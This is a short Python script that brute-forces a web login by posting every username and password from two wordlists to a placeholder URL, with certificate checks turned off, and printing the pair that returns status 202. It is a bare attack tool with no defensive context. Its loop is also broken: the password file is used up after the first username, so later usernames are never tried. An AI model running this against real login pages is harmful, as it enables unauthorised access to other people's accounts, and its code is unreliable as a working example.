import requests
with open('username_wordlist','r') as users:
    with open('password_wordlist','r') as passw:
        for usern in users: 
            for passc in passw:     
                res = requests.post("your_url",data={
                    "username":usern,
                    "password":passc
                },verify=False)
                if(res.status_code == 202):
                    print(f"Username: {usern} | Password: {passc} | Status Code: {res.status_code}")
                    exit(0);
                else:
                    print(f"Username: {usern} | Password: {passc} | Status Code: {res.status_code}")